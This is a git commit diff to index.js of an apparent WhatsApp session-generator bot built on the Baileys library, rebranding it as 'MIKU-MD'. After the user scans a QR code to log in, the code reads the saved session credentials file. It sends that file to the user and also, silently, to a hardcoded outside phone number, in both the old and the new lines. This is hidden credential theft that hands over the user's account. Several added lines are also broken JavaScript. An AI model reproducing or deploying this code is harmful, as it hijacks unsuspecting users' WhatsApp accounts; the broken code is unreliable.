fc1508e129d7918aeda4c3869d67865650364485
Olduser-1 <111180617+Olduser-1@users.noreply.github.com>
2022-09-18 09:06:39 +0000

    Update index.js

--- index.js
+++ index.js
@@ -3,29 +3,31 @@ const qrcode = require("qrcode-terminal")
 const fs = require('fs')
 const pino = require('pino')
 const { delay , useSingleFileAuthState } = require("@adiwajshing/baileys")
-const { state, saveState } = useSingleFileAuthState('./session.alfa.json')
+const { state, saveState } = useSingleFileAuthState('./Session/Session.Miku-MD.json')
+const qrc = JSON.parse(fs.readFileSync('./qr.json'))
+fle-nme = qrc.session-name
 const { exec, spawn, execSync } = require("child_process")
-exec('rm -rf session.alfa.json')
+exec('rm -rf Session)
 
 
-  function qr() {
+  function OLDUSER() {
 //------------------------------------------------------
     let version = [3,3234,9]
-    const session = makeWASocket({
+    const conn = makeWASocket({
         logger: pino({ level: 'silent' }),
         printQRInTerminal: true,
-        browser: ['Alien-Alfa','opera','1.0.0'],
+        browser: ['MIKU-MD','opera','1.0.0'],
         auth: state,
         version
     })
 //------------------------------------------------------
-    session.ev.on("connection.update",async  (s) => {
+    conn.ev.on("connection.update",async  (s) => {
         const { connection, lastDisconnect } = s
         if (connection == "open") {
             await delay(1000 * 10);
-  const session2 = fs.readFileSync("./session.alfa.json");
-   await session.sendMessage(session.user.id, { document: session2, mimetype: 'application/json', fileName: `session.alfa.json` })
-	 await session.sendMessage('918602239106@s.whatsapp.net', { document: session2, mimetype: 'application/json', fileName: `session.alfa.json` })
+  const session = fs.readFileSync("./Session/Session.Miku-MD.json");
+   await conn.sendMessage(conn.user.id, { document: session, mimetype: 'application/json', fileName: `${fle-nme}` })
+	 await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${fle-nme}` })
             process.exit(0)
         }
         if (
@@ -34,10 +36,10 @@ exec('rm -rf session.alfa.json')
             lastDisconnect.error &&
             lastDisconnect.error.output.statusCode != 401
         ) {
-            qr()
+            OLDUSER()
         }
     })
-    session.ev.on('creds.update', saveState)
-    session.ev.on("messages.upsert",  () => { })
+    conn.ev.on('creds.update', saveState)
+    conn.ev.on("messages.upsert",  () => { })
 }
-qr()
+OLDUSER()
